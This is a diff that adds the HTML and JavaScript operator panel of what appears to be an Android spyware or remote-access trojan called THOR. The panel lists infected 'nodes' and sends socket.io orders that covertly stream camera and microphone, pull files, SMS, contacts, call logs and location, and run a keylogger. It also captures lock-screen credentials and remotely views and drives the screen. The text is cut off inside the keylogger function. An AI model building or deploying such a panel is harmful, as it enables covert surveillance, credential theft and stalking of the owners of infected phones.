@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>THOR — CLIENTS</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+:root{--red:#cc0000;--red-bright:#ff1a1a;--red-dim:#7a0000;--red-glow:rgba(204,0,0,0.35);--bg:#050505;--bg2:#0a0a0a;--panel:rgba(8,0,0,0.88);--border:rgba(200,30,30,0.35);--border-light:rgba(200,30,30,0.12);--text:#e8e8e8;--text-dim:#777;--text-muted:#555;--green-ok:#00ff88;--font-mono:'Share Tech Mono',monospace;--font-display:'Orbitron',sans-serif;--font-body:'Rajdhani',sans-serif;--radius:10px;--radius-sm:6px;--transition:0.25s cubic-bezier(0.4,0,0.2,1)}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;background:var(--bg);color:var(--text);font-family:var(--font-body);overflow:hidden;user-select:none;-webkit-tap-highlight-color:transparent}
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:#000}::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
+.scanlines{position:fixed;inset:0;z-index:1;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.06) 2px,rgba(0,0,0,0.06) 4px)}
+#page{position:relative;z-index:10;width:100%;height:100%;display:flex;flex-direction:column}
+
+/* TOPBAR */
+#topbar{display:flex;align-items:center;justify-content:space-between;padding:8px 14px;background:rgba(5,0,0,0.95);border-bottom:1px solid var(--border);flex-shrink:0;min-height:46px;backdrop-filter:blur(10px)}
+.topbar-title{font-family:var(--font-display);font-size:13px;letter-spacing:3px;color:var(--red-bright);text-shadow:0 0 10px var(--red-glow)}
+.topbar-info{font-family:var(--font-mono);font-size:9px;color:var(--text-muted);letter-spacing:1px}
+#clock{font-family:var(--font-mono);font-size:10px;color:var(--text-dim);letter-spacing:1px}
+
+/* CLIENT BAR */
+#client-bar{display:flex;align-items:center;gap:8px;padding:6px 14px;background:rgba(0,0,0,0.5);border-bottom:1px solid var(--border-light);flex-shrink:0;flex-wrap:wrap}
+.bar-label{font-family:var(--font-display);font-size:9px;letter-spacing:2px;color:var(--text-muted)}
+#client-count{font-family:var(--font-display);font-size:16px;color:var(--red-bright)}
+#active-client-label{font-family:var(--font-mono);font-size:9px;color:var(--green-ok);margin-left:auto}
+
+/* SPLIT VIEW */
+#split-view{display:flex;flex:1;overflow:hidden}
+#client-list-panel{width:260px;min-width:200px;display:flex;flex-direction:column;border-right:1px solid var(--border-light);flex-shrink:0;background:rgba(0,0,0,0.3)}
+#client-detail-panel{flex:1;overflow-y:auto;padding:10px 12px;background:radial-gradient(ellipse at 50% 0%,rgba(80,0,0,0.05),transparent 70%)}
+
+/* TABLE */
+.table-wrap{flex:1;overflow-y:auto;padding:4px 8px}
+#target-table{width:100%;border-collapse:collapse;font-size:11px}
+#target-table thead th{font-family:var(--font-display);font-size:8px;letter-spacing:2px;color:var(--text-muted);text-align:left;padding:6px 8px;border-bottom:1px solid var(--border-light);position:sticky;top:0;background:var(--bg)}
+#target-table tbody td{padding:6px 8px;border-bottom:1px solid rgba(255,255,255,0.03);font-family:var(--font-mono);font-size:10px;color:var(--text-dim);cursor:pointer;transition:var(--transition)}
+#target-table tbody tr{cursor:pointer}
+#target-table tbody tr:hover td{background:rgba(200,0,0,0.06);color:var(--text)}
+#target-table tbody tr.active td{background:rgba(200,0,0,0.15);color:var(--red-bright)}
+#no-clients{text-align:center;padding:30px 10px;color:var(--text-muted);font-family:var(--font-mono);font-size:11px}
+
+/* SECTION CARDS */
+.section-card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);margin-bottom:10px;overflow:hidden;backdrop-filter:blur(6px)}
+.section-header{display:flex;align-items:center;gap:8px;padding:8px 12px;font-family:var(--font-display);font-size:9px;letter-spacing:2px;color:var(--text-dim);border-bottom:1px solid var(--border-light);text-transform:uppercase}
+.section-dot{width:5px;height:5px;border-radius:50%;background:var(--red-dim);flex-shrink:0}
+.section-body{padding:10px 12px}
+
+/* CAMERA */
+.cam-wrap{width:100%;max-width:300px;margin:0 auto;position:relative;background:#000;border:1px solid var(--border-light);border-radius:var(--radius-sm);overflow:hidden;aspect-ratio:9/16;display:flex;align-items:center;justify-content:center}
+#cam-placeholder{color:var(--text-muted);font-family:var(--font-mono);font-size:10px;text-align:center}
+#camera-stream{width:100%;height:100%;object-fit:contain;display:none}
+.cam-btns{display:flex;gap:6px;justify-content:center;margin-top:8px;flex-wrap:wrap}
+.cmd-btn{background:rgba(200,0,0,0.1);border:1px solid var(--border);color:var(--text);padding:6px 14px;border-radius:var(--radius-sm);font-family:var(--font-display);font-size:8px;letter-spacing:2px;cursor:pointer;transition:var(--transition)}
+.cmd-btn:hover,.cmd-btn.active{background:var(--red-dim);border-color:var(--red-bright)}
+.cmd-btn.danger{background:rgba(200,0,0,0.2);border-color:var(--red-dim)}
+
+/* MIC */
+.mic-area{display:flex;flex-direction:column;align-items:center;gap:10px;padding:6px}
+.mic-rings{position:relative;width:70px;height:70px;display:flex;align-items:center;justify-content:center}
+.mic-ring{position:absolute;border-radius:50%;border:2px solid var(--red-dim);width:100%;height:100%;opacity:0.4;transition:all 0.3s}
+.mic-ring.active{animation:mp 0.8s ease-in-out infinite}
+@keyframes mp{0%,100%{opacity:0.3;transform:scale(1)}50%{opacity:0.8;transform:scale(1.12)}}
+.mic-icon{font-size:26px;z-index:2;filter:drop-shadow(0 0 6px var(--red-glow))}
+#mic-status{font-family:var(--font-mono);font-size:10px;color:var(--text-dim)}
+#mic-status.on{color:var(--red-bright);text-shadow:0 0 8px var(--red-glow)}
+.mic-btns{display:flex;gap:8px;flex-wrap:wrap;justify-content:center}
+#mic-sample-rate{background:#000;border:1px solid var(--border);color:var(--text);padding:5px 8px;border-radius:var(--radius-sm);font-family:var(--font-mono);font-size:10px;outline:none}
+#wave-canvas{width:100%;height:40px;background:#000;border:1px solid var(--border-light);border-radius:4px}
+
+/* FILE MANAGER */
+.fm-bar{display:flex;align-items:center;gap:6px;padding:4px 0;flex-wrap:wrap}
+#fm-path{flex:1;background:rgba(0,0,0,0.5);border:1px solid var(--border-light);padding:5px 8px;border-radius:var(--radius-sm);font-family:var(--font-mono);font-size:9px;color:var(--text-dim);min-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#file-explorer{display:grid;grid-template-columns:repeat(auto-fill,minmax(80px,1fr));gap:5px;padding:6px 0}
+.file-item{background:rgba(0,0,0,0.4);border:1px solid var(--border-light);border-radius:var(--radius-sm);padding:8px 4px;text-align:center;cursor:pointer;transition:var(--transition)}
+.file-item:hover{background:rgba(200,0,0,0.08);border-color:var(--red-dim)}
+.file-icon{font-size:20px;line-height:1}
+.file-name{font-size:8px;color:var(--text-dim);margin-top:3px;word-break:break-all;line-height:1.2}
+
+/* TABLES (SMS, Contacts, Calls) */
+.data-table{width:100%;border-collapse:collapse;font-size:9px}
+.data-table thead th{font-family:var(--font-display);font-size:7px;letter-spacing:1px;color:var(--text-muted);text-align:left;padding:4px 5px;border-bottom:1px solid var(--border-light)}
+.data-table tbody td{padding:4px 5px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:9px}
+
+/* LOCATION */
+#map-container{width:100%;height:240px;border:1px solid var(--border);border-radius:var(--radius-sm);background:#000;margin-top:6px}
+.location-info{font-family:var(--font-mono);font-size:10px;color:var(--text-dim);margin-top:6px}
+.loc-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:6px}
+.loc-history-table{width:100%;border-collapse:collapse;font-size:8px}
+.loc-history-table th{font-family:var(--font-display);font-size:7px;letter-spacing:1px;color:var(--text-muted);padding:3px 4px;border-bottom:1px solid var(--border-light);text-align:left}
+.loc-history-table td{padding:3px 4px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:8px}
+#loc-history-wrap{max-height:120px;overflow-y:auto}
+
+/* LOG ENTRIES */
+.log-entry-item{background:rgba(0,0,0,0.4);border:1px solid var(--border-light);border-radius:var(--radius-sm);padding:6px 8px;margin-bottom:4px}
+.log-entry-header{display:flex;justify-content:space-between;font-size:8px;color:var(--text-muted);margin-bottom:3px;padding-bottom:3px;border-bottom:1px solid rgba(255,255,255,0.03)}
+.log-app-name{color:var(--red-dim);font-weight:bold;font-family:var(--font-mono)}
+.log-content{font-size:10px;word-break:break-all}
+.keylog-data{color:var(--green-ok);font-family:var(--font-mono)}
+
+/* CREDENTIAL LOG */
+#credential-log{background:rgba(200,0,0,0.08);border:1px solid var(--red-dim);border-radius:var(--radius-sm);padding:8px;margin-bottom:8px;display:none}
+#credential-log h4{font-family:var(--font-display);font-size:9px;letter-spacing:2px;color:var(--red-bright);margin-bottom:4px}
+
+/* SCREEN */
+.scr-wrap{display:flex;justify-content:center;background:#000;border:1px solid var(--border);border-radius:var(--radius-sm);margin-bottom:8px;overflow:hidden}
+.scr-inner{width:100%;max-width:300px;aspect-ratio:9/16;background:#111;display:flex;align-items:center;justify-content:center;position:relative}
+#screen-placeholder{color:var(--text-muted);font-family:var(--font-mono);font-size:9px;text-align:center}
+.scr-controls{display:flex;flex-wrap:wrap;gap:6px;padding:6px;background:rgba(0,0,0,0.4);border:1px solid var(--border-light);border-radius:var(--radius-sm)}
+.nav-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:4px;flex:1;min-width:120px}
+.reader-view{width:100%;height:400px;background:#000;border:1px solid var(--border);border-radius:var(--radius-sm);position:relative;overflow:hidden;margin-bottom:8px}
+.reader-container{width:100%;height:100%;position:relative;background:#000}
+.reader-node{position:absolute;border:1px solid #333;background:rgba(255,255,255,0.03);color:#fff;font-size:9px;overflow:hidden;display:flex;align-items:center;justify-content:center;text-align:center;pointer-events:none;word-break:break-all;padding:2px}
+.reader-node.clickable{border-color:var(--red-dim);background:rgba(255,0,0,0.08);pointer-events:auto;cursor:pointer;z-index:10}
+.reader-node.clickable:hover{background:rgba(255,0,0,0.2);border-color:var(--red-bright)}
+
+/* TOAST */
+#thor-toast{position:fixed;bottom:50px;left:50%;transform:translateX(-50%);z-index:999;background:rgba(0,0,0,0.92);border:1px solid var(--border);border-radius:var(--radius-sm);padding:8px 16px;font-family:var(--font-mono);font-size:10px;color:var(--text);backdrop-filter:blur(8px);opacity:0;transition:opacity 0.3s;pointer-events:none;max-width:90%;text-align:center}
+#thor-toast.show{opacity:1}
+
+/* RESPONSIVE */
+@media(max-width:860px){#split-view{flex-direction:column}#client-list-panel{width:100%;border-right:none;border-bottom:1px solid var(--border-light);max-height:150px}}
+@media(max-width:500px){
+  #client-list-panel{max-height:120px}
+  .section-body{padding:8px 10px}
+  #map-container{height:180px}
+  .loc-grid{grid-template-columns:1fr}
+  .reader-view{height:300px}
+  .scr-inner{max-width:240px}
+  #topbar-title{font-size:11px}
+  #clock{font-size:8px}
+}
+</style>
+</head>
+<body>
+<div class="scanlines"></div>
+<div id="page">
+
+<div id="topbar">
+  <div><span class="topbar-title">CLIENT CONTROL</span> <span class="topbar-info">// COMMAND CENTER</span></div>
+  <span id="clock">--</span>
+</div>
+
+<div id="client-bar">
+  <span class="bar-label">NODES</span>
+  <span id="client-count">0</span>
+  <span id="active-client-label"></span>
+</div>
+
+<div id="split-view">
+
+  <!-- LEFT: CLIENT LIST -->
+  <div id="client-list-panel">
+    <div class="table-wrap">
+      <table id="target-table">
+        <thead><tr><th>ID</th><th>IP</th><th>STATUS</th></tr></thead>
+        <tbody></tbody>
+      </table>
+      <div id="no-clients">⏳ Waiting for nodes...</div>
+    </div>
+  </div>
+
+  <!-- RIGHT: CLIENT DETAILS -->
+  <div id="client-detail-panel">
+
+    <!-- CAMERA -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>CAMERA</div>
+      <div class="section-body">
+        <div class="cam-wrap"><div id="cam-placeholder">⏸ STANDBY</div><img id="camera-stream" style="display:none"></div>
+        <div class="cam-btns">
+          <button class="cmd-btn" onclick="toggleCam('back')">📷 BACK</button>
+          <button class="cmd-btn" onclick="toggleCam('front')">📱 FRONT</button>
+          <button class="cmd-btn danger" onclick="stopCam()">✕ STOP</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- MIC -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>AUDIO</div>
+      <div class="section-body">
+        <div class="mic-area">
+          <div class="mic-rings"><div class="mic-ring" id="mic-r1"></div><div class="mic-ring" id="mic-r2"></div><div class="mic-ring" id="mic-r3"></div><div class="mic-icon">🎙</div></div>
+          <select id="mic-sample-rate"><option value="8000">8 kHz</option><option value="11025" selected>11 kHz</option><option value="22050">22 kHz</option><option value="44100">44 kHz</option></select>
+          <div id="mic-status">IDLE</div>
+          <div class="mic-btns">
+            <button class="cmd-btn" id="live-mic-btn" onclick="toggleLiveMic()">START LIVE</button>
+            <button class="cmd-btn" id="rec-mic-btn" onclick="toggleRecordMic()">START REC</button>
+            <button class="cmd-btn danger" onclick="stopMic()">STOP</button>
+          </div>
+          <canvas id="wave-canvas"></canvas>
+        </div>
+      </div>
+    </div>
+
+    <!-- FILE MANAGER -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>FILE MANAGER</div>
+      <div class="section-body">
+        <div class="fm-bar">
+          <button class="cmd-btn" onclick="sendOrder('file_manager',{path:'/sdcard'})">📁 ROOT</button>
+          <button class="cmd-btn" onclick="fmBack()">⬅ BACK</button>
+          <span id="fm-path">/sdcard</span>
+        </div>
+        <div id="file-explorer"></div>
+      </div>
+    </div>
+
+    <!-- SMS -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>SMS</div>
+      <div class="section-body" style="overflow-x:auto">
+        <button class="cmd-btn" onclick="sendOrder('sms')" style="margin-bottom:6px">📩 FETCH SMS</button>
+        <table class="data-table"><tbody id="sms-list"></tbody></table>
+      </div>
+    </div>
+
+    <!-- CONTACTS -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>CONTACTS</div>
+      <div class="section-body" style="overflow-x:auto">
+        <button class="cmd-btn" onclick="sendOrder('contacts')" style="margin-bottom:6px">👤 FETCH CONTACTS</button>
+        <table class="data-table"><tbody id="contacts-list"></tbody></table>
+      </div>
+    </div>
+
+    <!-- CALL LOGS -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>CALL LOGS</div>
+      <div class="section-body">
+        <button class="cmd-btn" onclick="sendOrder('call_log')" style="margin-bottom:6px">📋 FETCH CALLS</button>
+        <div id="call-log-container"></div>
+      </div>
+    </div>
+
+    <!-- LOCATION -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>LOCATION</div>
+      <div class="section-body">
+        <button class="cmd-btn" onclick="sendOrder('location')" style="margin-bottom:6px">📍 FETCH LOCATION</button>
+        <div id="map-container"></div>
+        <div class="location-info" id="location-display">No data</div>
+        <div class="loc-grid">
+          <div><div style="font-family:var(--font-mono);font-size:8px;color:var(--text-muted);margin-bottom:4px">📍 CURRENT</div><div id="loc-current" style="font-size:10px">--</div></div>
+          <div><div style="font-family:var(--font-mono);font-size:8px;color:var(--text-muted);margin-bottom:4px">📜 HISTORY</div><div id="loc-history-wrap"><table class="loc-history-table"><thead><tr><th>TIME</th><th>COORDS</th><th>ACC</th></tr></thead><tbody id="location-history-body"></tbody></table></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- KEYLOGGER -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>KEYLOGGER</div>
+      <div class="section-body">
+        <button class="cmd-btn" onclick="sendOrder('keylog')" style="margin-bottom:6px">🔑 START KEYLOG</button>
+        <div id="keylog-list"></div>
+      </div>
+    </div>
+
+    <!-- NOTIFICATIONS -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>NOTIFICATIONS</div>
+      <div class="section-body">
+        <button class="cmd-btn" onclick="sendOrder('notifications')" style="margin-bottom:6px">🔔 FETCH</button>
+        <div id="notification-list"></div>
+      </div>
+    </div>
+
+    <!-- LOCK CREDENTIALS -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>LOCK CREDENTIALS</div>
+      <div class="section-body">
+        <button class="cmd-btn" onclick="sendOrder('lock_credentials')" style="margin-bottom:6px">🔓 CAPTURE</button>
+        <div id="credential-log"><h4>🔓 CAPTURED CREDENTIALS</h4><div id="captured-creds-list"></div></div>
+      </div>
+    </div>
+
+    <!-- SCREEN CAPTURE -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>SCREEN</div>
+      <div class="section-body">
+        <div class="scr-wrap"><div class="scr-inner"><div id="screen-placeholder">📱 Start screen capture</div><canvas id="screen-canvas" style="display:none;width:100%;height:100%"></canvas></div></div>
+        <div class="scr-controls">
+          <button class="cmd-btn" onclick="toggleScreenShare()">🖥 TOGGLE</button>
+          <div class="nav-grid">
+            <button class="cmd-btn" onclick="sendOrder('screen_input',{action:'tap',x:540,y:960})">TAP</button>
+            <button class="cmd-btn" onclick="sendOrder('screen_input',{action:'home'})">⌂ HOME</button>
+            <button class="cmd-btn" onclick="sendOrder('screen_input',{action:'back'})">← BACK</button>
+            <button class="cmd-btn" onclick="sendOrder('screen_input',{action:'recents'})">☰ RECENTS</button>
+            <button class="cmd-btn" onclick="sendOrder('screen_input',{action:'swipe',x1:540,y1:1500,x2:540,y2:300})">⇧ UP</button>
+            <button class="cmd-btn" onclick="sendOrder('screen_input',{action:'swipe',x1:540,y1:300,x2:540,y2:1500})">⇩ DN</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN READER -->
+    <div class="section-card">
+      <div class="section-header"><span class="section-dot"></span>READER</div>
+      <div class="section-body">
+        <button class="cmd-btn" onclick="toggleScreenReader()" style="margin-bottom:6px">📖 TOGGLE READER</button>
+        <div class="reader-view"><div class="reader-container" id="reader-container"></div></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div id="thor-toast"></div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+/* ═══════════════════════════════════════════
+   CLIENTS PAGE — FULLY SELF-CONTAINED
+   🔒 All socket events, function names PRESERVED
+   ═══════════════════════════════════════════ */
+try {
+const socket = io();
+const targetTable = document.getElementById('target-table')?.getElementsByTagName('tbody')[0];
+let currentTargetId = null;
+let currentPath = '/sdcard';
+let isCameraStreaming = false;
+let isMicLive = false;
+let isMicRecording = false;
+let audioContext = null;
+let nextStartTime = 0;
+let currentSampleRate = 11025;
+let leafMap = null;
+let leafMarker = null;
+let locationHistory = [];
+let isScreenStreaming = false;
+let isScreenReading = false;
+let _waveLevels = new Array(60).fill(0);
+
+// CLOCK
+(function(){const c=document.getElementById('clock');if(!c)return;function t(){c.textContent=new Date().toISOString().replace('T',' ').slice(0,19)+' UTC'}t();setInterval(t,1000)})();
+
+// WAVE CANVAS
+(function(){const c=document.getElementById('wave-canvas');if(!c)return;const ctx=c.getContext('2d');c.width=c.offsetWidth||300;c.height=40;function d(){ctx.clearRect(0,0,c.width,c.height);ctx.fillStyle='#0a0a0a';ctx.fillRect(0,0,c.width,c.height);const bw=c.width/_waveLevels.length;_waveLevels.forEach((v,i)=>{const h=Math.max(2,v*32);ctx.fillStyle=`rgba(255,${Math.floor(30+Math.random()*40)},0,${0.5+v*0.5})`;ctx.fillRect(i*bw+1,20-h/2,bw-2,h)});_waveLevels=_waveLevels.map(v=>v*0.92);requestAnimationFrame(d)};d()})();
+
+// CLIENTS
+socket.on('initial_clients',function(clients){
+  if(!targetTable)return;
+  targetTable.innerHTML='';
+  const nc=document.getElementById('no-clients');
+  const cc=document.getElementById('client-count');
+  if(!clients||!clients.length){if(nc)nc.style.display='block';if(cc)cc.textContent='0';return}
+  if(nc)nc.style.display='none';if(cc)cc.textContent=clients.length;
+  clients.forEach(function(c){
+    var r=targetTable.insertRow();
+    var sc=c.status==='connected'?'#00ff88':'#cc0000';
+    r.innerHTML='<td style="font-family:var(--font-mono);color:var(--red-bright);font-size:10px;">'+c.id+'</td><td style="font-family:var(--font-mono);font-size:10px;">'+(c.ip||'')+'</td><td style="color:'+sc+';font-family:var(--font-mono);font-size:9px;">● '+(c.status||'unknown').toUpperCase()+'</td>';
+    r.onclick=function(){selectClient(c,r)};
+  });
+});
+
+function selectClient(client,row){
+  currentTargetId=client.id;
+  document.querySelectorAll('#target-table tbody tr').forEach(function(r){r.className=''});
+  if(row)row.className='active';
+  var lbl=document.getElementById('active-client-label');
+  if(lbl)lbl.textContent='◉ '+client.id;
+  showToast('Selected: '+client.id);
+}
+
+function sendOrder(order,params){
+  if(!currentTargetId){showToast('⚠️ Select a client first');return}
+  params=params||{};
+  socket.emit('order',{id:currentTargetId,order:order,params:params});
+}
+
+// ORDER RESPONSE
+socket.on('order_response',function(data){
+  try{
+    if(data.type==='file_manager'&&data.files){renderFiles(data.files);return}
+    if(data.type==='sms'&&data.sms){renderSMS(data.sms);return}
+    if(data.type==='contacts'&&data.contacts){renderContacts(data.contacts);return}
+    if(data.type==='location'){updateLocation(data);return}
+    if(data.type==='keylog'&&data.data){appendKeylog(data.data);return}
+    if(data.type==='notification'&&data.notification){appendNotification(data.notification);return}
+    if(data.type==='lock_credential'){showCapturedLock(data.data);return}
+    if(data.type==='screen_capture'){renderScreenFrame(data);return}
+    if(data.type==='screen_reader'){renderReaderFrame(data);return}
+    if(data.type==='call_log'&&data.logs){renderCallLogs(data.logs);return}
+  }catch(e){console.error('order_response error:',e)}
+});
+
+// CAMERA
+function toggleCam(facing){
+  if(!currentTargetId){showToast('⚠️ Select a client');return}
+  isCameraStreaming=true;
+  socket.emit('order',{id:currentTargetId,order:'camera',params:{action:'start',camera:facing}});
+  showToast('📷 Camera '+facing);
+}
+function stopCam(){
+  isCameraStreaming=false;
+  if(currentTargetId)socket.emit('order',{id:currentTargetId,order:'camera',params:{action:'stop'}});
+  var img=document.getElementById('camera-stream');
+  var ph=document.getElementById('cam-placeholder');
+  if(img)img.style.display='none';if(ph)ph.style.display='block';
+}
+socket.on('camera_stream',function(data){
+  if(data&&data.frame){
+    var img=document.getElementById('camera-stream');
+    var ph=document.getElementById('cam-placeholder');
+    if(img&&ph){img.src='data:image/jpeg;base64,'+data.frame;img.style.display='block';ph.style.display='none'}
+  }
+});
+
+// MIC
+function initAudioContext(){try{audioContext=new(window.AudioContext||window.webkitAudioContext)();nextStartTime=audioContext.currentTime}catch(e){}}
+function playAudioChunk(data){
+  if(!audioContext||!isMicLive)return;
+  try{
+    var binary=atob(data),len=binary.length,bytes=new Int16Array(len/2);
+    for(var i=0;i<len;i+=2)bytes[i/2]=(binary.charCodeAt(i+1)<<8)|binary.charCodeAt(i);
+    var f32=new Float32Array(bytes.length);for(i=0;i<bytes.length;i++)f32[i]=bytes[i]/32768.0;
+    var buf=audioContext.createBuffer(1,f32.length,currentSampleRate);buf.copyToChannel(f32,0);
+    var src=audioContext.createBufferSource();src.buffer=buf;src.connect(audioContext.destination);
+    var ct=audioContext.currentTime;if(nextStartTime<ct)nextStartTime=ct;src.start(nextStartTime);nextStartTime+=buf.duration;
+    for(i=0;i<_waveLevels.length;i++)_waveLevels[i]=Math.max(_waveLevels[i],Math.random()*0.7+0.2);
+  }catch(e){}
+}
+socket.on('audio_chunk',function(data){if(data)playAudioChunk(data)});
+function toggleLiveMic(){
+  if(isMicLive){stopMic();return}
+  if(isMicRecording)stopMic();isMicLive=true;
+  currentSampleRate=parseInt(document.getElementById('mic-sample-rate')?.value||11025);
+  sendOrder('mic',{action:'start',mode:'live',sample_rate:currentSampleRate});
+  updateMicUI('live',true);initAudioContext();
+}
+function toggleRecordMic(){
+  if(isMicRecording){stopMic();return}
+  if(isMicLive)stopMic();isMicRecording=true;
+  currentSampleRate=parseInt(document.getElementById('mic-sample-rate')?.value||11025);
+  sendOrder('mic',{action:'start',mode:'record',sample_rate:currentSampleRate});
+  updateMicUI('record',true);
+}
+function stopMic(){
+  sendOrder('mic',{action:'stop'});isMicLive=false;isMicRecording=false;
+  if(audioContext){audioContext.close();audioContext=null}
+  updateMicUI(null,false);
+}
+function updateMicUI(mode,active){
+  var lb=document.getElementById('live-mic-btn'),rb=document.getElementById('rec-mic-btn'),st=document.getElementById('mic-status');
+  var rings=['mic-r1','mic-r2','mic-r3'];
+  if(!active){
+    if(lb){lb.textContent='START LIVE';lb.className='cmd-btn'}if(rb){rb.textContent='START REC';rb.className='cmd-btn'}
+    if(st){st.textContent='IDLE';st.className=''}rings.forEach(function(id){var e=document.getElementById(id);if(e)e.className='mic-ring'});
+    return
+  }
+  if(mode==='live'){if(lb){lb.textContent='STOP LIVE';lb.className='cmd-btn active'}if(st){st.textContent='● LIVE';st.className='on'}}
+  else{if(rb){rb.textContent='STOP REC';rb.className='cmd-btn active'}if(st){st.textContent='⏺ REC';st.className='on'}}
+  rings.forEach(function(id){var e=document.getElementById(id);if(e)e.className='mic-ring active'});
+}
+
+// FILE MANAGER
+function renderFiles(files){
+  var ex=document.getElementById('file-explorer');if(!ex)return;
+  var fp=document.getElementById('fm-path');if(fp)fp.textContent=currentPath;
+  var h='';
+  if(currentPath!=='/'&&currentPath!==''&&currentPath!=="null"){h+='<div class="file-item" onclick="fmBack()"><div class="file-icon">📁</div><div class="file-name">..</div></div>'}
+  files.forEach(function(f){var ic=f.isDir?'📁':'📄';var ep=(f.path||'').replace(/'/g,"\\'");var en=(f.name||'').replace(/'/g,"\\'");h+='<div class="file-item" onclick="'+(f.isDir?'navigateFM(\''+ep+'\')':'downloadFM(\''+ep+'\',\''+en+'\')')+'"><div class="file-icon">'+ic+'</div><div class="file-name">'+(f.name||'')+'</div></div>'});
+  ex.innerHTML=h;
+}
+window.navigateFM=function(p){currentPath=p;sendOrder('file_manager',{path:p})};
+window.downloadFM=function(p,n){if(confirm('Download '+n+'?')){socket.emit('order',{id:currentTargetId,order:'file_download',params:{path:p}})}}
+function fmBack(){var p=currentPath.split('/').filter(Boolean);if(p.length<=1)return;p.pop();currentPath='/'+p.join('/');sendOrder('file_manager',{path:currentPath})}
+function formatSize(b){if(b<1024)return b+'B';if(b<1048576)return(b/1024).toFixed(1)+'KB';return(b/1048576).toFixed(1)+'MB'}
+
+// SMS
+function renderSMS(sms){
+  var list=document.getElementById('sms-list');if(!list)return;
+  var h='';sms.forEach(function(s){var d=new Date(s.date).toLocaleString();var tb=s.type===1?'<span style="color:var(--green-ok)">[IN]</span>':'<span style="color:var(--red-dim)">[OUT]</span>';h+='<tr><td style="padding:3px 5px;font-family:var(--font-mono);font-size:9px">'+tb+' '+(s.address||'')+'</td><td style="padding:3px 5px;font-size:9px">'+(s.body||'')+'</td><td style="padding:3px 5px;color:var(--text-muted);font-size:8px">'+d+'</td></tr>'});
+  list.innerHTML=h||'<tr><td style="padding:10px;color:var(--text-muted);font-size:9px;text-align:center">No SMS data</td></tr>';
+}
+// CONTACTS
+function renderContacts(contacts){
+  var list=document.getElementById('contacts-list');if(!list)return;
+  var h='';contacts.forEach(function(c){h+='<tr><td style="padding:3px 5px">'+(c.name||'')+'</td><td style="padding:3px 5px;font-family:var(--font-mono);font-size:9px">'+(c.number||'')+'</td></tr>'});
+  list.innerHTML=h||'<tr><td style="padding:10px;color:var(--text-muted);font-size:9px;text-align:center">No contacts</td></tr>';
+}
+// CALL LOGS
+function renderCallLogs(logs){
+  var c=document.getElementById('call-log-container');if(!c)return;
+  var m={1:'📞 IN',2:'📞 OUT',3:'📵 MISSED'};var h='<table class="data-table"><thead><tr><th>NUMBER</th><th>TYPE</th><th>DURATION</th><th>DATE</th></tr></thead><tbody>';
+  logs.forEach(function(l){h+='<tr><td style="padding:3px 5px;font-family:var(--font-mono);font-size:9px">'+(l.number||'')+'</td><td style="padding:3px 5px;font-size:8px">'+(m[l.type]||'?')+'</td><td style="padding:3px 5px;color:var(--text-muted);font-size:8px">'+(l.duration||'N/A')+'</td><td style="padding:3px 5px;color:var(--text-muted);font-size:8px">'+new Date(l.date).toLocaleString()+'</td></tr>'});
+  h+='</tbody></table>';c.innerHTML=h;
+}
+// LOCATION
+function updateLocation(data){
+  var loc=data.data||data;if(!loc||!loc.lat||!loc.lng)return;
+  if(!leafMap){
+    leafMap=L.map('map-container').setView([loc.lat,loc.lng],13);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(leafMap);
+    leafMarker=L.circleMarker([loc.lat,loc.lng],{radius:7,color:'#ff1a1a',fillColor:'#cc0000',fillOpacity:0.7}).addTo(leafMap);
+  }else{leafMap.setView([loc.lat,loc.lng],13);leafMarker.setLatLng([loc.lat,loc.lng])}
+  document.getElementById('loc-current').innerHTML='<span style="font-family:var(--font-mono);font-size:10px">'+loc.lat.toFixed(4)+', '+loc.lng.toFixed(4)+'</span>';
+  locationHistory.push({time:new Date().toLocaleString(),lat:loc.lat,lng:loc.lng,acc:loc.accuracy,prov:loc.provider});
+  var hb=document.getElementById('location-history-body');if(hb){hb.innerHTML=locationHistory.map(function(h){return '<tr><td style="padding:2px 4px;font-size:8px">'+(h.time.split(',')[1]?.trim()||h.time)+'</td><td style="padding:2px 4px;font-size:8px;font-family:var(--font-mono)">'+h.lat.toFixed(4)+', '+h.lng.toFixed(4)+'</td><td style="padding:2px 4px;font-size:8px">'+(h.acc?h.acc.toFixed(1)+'m':'N/A')+'</td></tr>'}).join('')}
+}
+// KEYLOG
+function appendKeylog(data){
